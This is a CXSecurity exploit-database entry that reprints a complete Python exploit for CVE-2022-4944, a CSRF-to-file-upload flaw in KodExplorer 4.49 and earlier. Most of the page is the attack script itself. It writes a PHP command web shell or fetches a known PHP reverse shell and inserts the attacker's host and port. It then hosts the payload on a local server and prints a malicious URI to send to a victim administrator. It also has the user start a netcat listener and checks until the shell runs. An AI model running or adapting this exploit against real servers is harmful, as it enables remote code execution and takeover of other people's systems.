---
title: KODExplorer 4.49 Cross Site Request Forgery / Shell Upload
url: https://cxsecurity.com/issue/WLB-2023040065
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-04-22
fetch_date: 2025-10-04T11:32:34.890181
---

# KODExplorer 4.49 Cross Site Request Forgery / Shell Upload

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **KODExplorer 4.49 Cross Site Request Forgery / Shell Upload** **2023.04.21**  Credit:  **[Mr Empy](https://cxsecurity.com/author/Mr%2BEmpy/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2022-4944](https://cxsecurity.com/cveshow/CVE-2022-4944/ "Click to see CVE-2022-4944")**  CWE: **[CWE-352](https://cxsecurity.com/cwe/CWE-352 "Click to see CWE-352")  [CWE-264](https://cxsecurity.com/cwe/CWE-264 "Click to see CWE-264")** | |

# Exploit Title: KodExplorer <= 4.49 - CSRF to Arbitrary File Upload
# Date: 21/04/2023
# Exploit Author: Mr Empy
# Software Link: https://github.com/kalcaddle/KodExplorer
# Version: <= 4.49
# Tested on: Linux
# References:
# \* https://vuldb.com/?id.227000
# \* https://www.cve.org/CVERecord?id=CVE-2022-4944
# \* https://github.com/MrEmpy/CVE-2022-4944
import argparse
import http.server
import socketserver
import os
import threading
import requests
from time import sleep
def banner():
print('''
\_ \_\_\_\_\_\_\_\_\_\_\_\_\_ \_\_\_\_\_ \_ \_\_\_\_\_\_ \_\_\_\_\_
\_\_\_\_\_
| | / / \_ | \_ \ \_\_\_| | | | \_\_\_ \/ \_\_ \|
\_\_\_|
| |/ /| | | | | | | |\_\_\_\_ \_\_\_ \_\_ | | \_\_\_ \_ \_\_ \_\_\_ \_ \_\_ | |\_/ /| / \/|
|\_\_
| \| | | | | | | \_\_\ \/ / '\_ \| |/ \_ \| '\_\_/ \_ \ '\_\_| | / | | |
\_\_|
| |\ \ \\_/ / |/ /| |\_\_\_> <| |\_) | | (\_) | | | \_\_/ | | |\ \ | \\_\_/\|
|\_\_\_
\\_| \\_/\\_\_\_/|\_\_\_/ \\_\_\_\_/\_/\\_\ .\_\_/|\_|\\_\_\_/|\_| \\_\_\_|\_| \\_| \\_|
\\_\_\_\_/\\_\_\_\_/
| |
|\_|
[KODExplorer <= v4.49 Remote Code Executon]
[Coded by MrEmpy]
''')
def httpd():
port = 8080
httpddir = os.path.join(os.path.dirname(\_\_file\_\_), 'http')
os.chdir(httpddir)
Handler = http.server.SimpleHTTPRequestHandler
httpd = socketserver.TCPServer(('', port), Handler)
print('[+] HTTP Server started')
httpd.serve\_forever()
def webshell(url, lhost):
payload = '<pre><?php system($\_GET["cmd"])?></pre>'
path = '/data/User/admin/home/'
targetpath = input('[\*] Target KODExplorer path (ex /var/www/html): ')
wshell\_f = open('http/shell.php', 'w')
wshell\_f.write(payload)
wshell\_f.close()
print('[\*] Opening HTTPd port')
th = threading.Thread(target=httpd)
th.start()
print(f'[+] Send this URI to your target:
{url}/index.php?explorer/serverDownload&type=download&savePath={targetpath}/data/User/admin/home/&url=http://
{lhost}:8080/shell.php&uuid=&time=')
print(f'[+] After the victim opens the URI, his shell will be hosted at
{url}/data/User/admin/home/shell.php?cmd=whoami')
def reverseshell(url, lhost):
rvpayload = '
https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
'
path = '/data/User/admin/home/'
targetpath = input('[\*] Target KODExplorer path (ex /var/www/html): ')
lport = input('[\*] Your local port: ')
reqpayload = requests.get(rvpayload).text
reqpayload = reqpayload.replace('127.0.0.1', lhost)
reqpayload = reqpayload.replace('1234', lport)
wshell\_f = open('http/shell.php', 'w')
wshell\_f.write(reqpayload)
wshell\_f.close()
print('[\*] Opening HTTPd port')
th = threading.Thread(target=httpd)
th.start()
print(f'[+] Send this URI to your target:
{url}/index.php?explorer/serverDownload&type=download&savePath={targetpath}/data/User/admin/home/&url=http://
{lhost}:8080/shell.php&uuid=&time=')
input(f'[\*] Run the command "nc -lnvp {lport}" to receive the
connection and press any key\n')
while True:
hitshell = requests.get(f'{url}/data/User/admin/home/shell.php')
sleep(1)
if not hitshell.status\_code == 200:
continue
else:
print('[+] Shell sent and executed!')
break
def main(url, lhost, mode):
banner()
if mode == 'webshell':
webshell(url, lhost)
elif mode == 'reverse':
reverseshell(url, lhost)
else:
print('[-] There is no such mode. Use webshell or reverse')
if \_\_name\_\_ == "\_\_main\_\_":
parser = argparse.ArgumentParser()
parser.add\_argument('-u','--url', action='store', help='target url',
dest='url', required=True)
parser.add\_argument('-lh','--local-host', action='store', help='local
host', dest='lhost', required=True)
parser.add\_argument('-m','--mode', action='store', help='mode
(webshell, reverse)', dest='mode', required=True)
arguments = parser.parse\_args()
main(arguments.url, arguments.lhost, arguments.mode)

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023040065)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top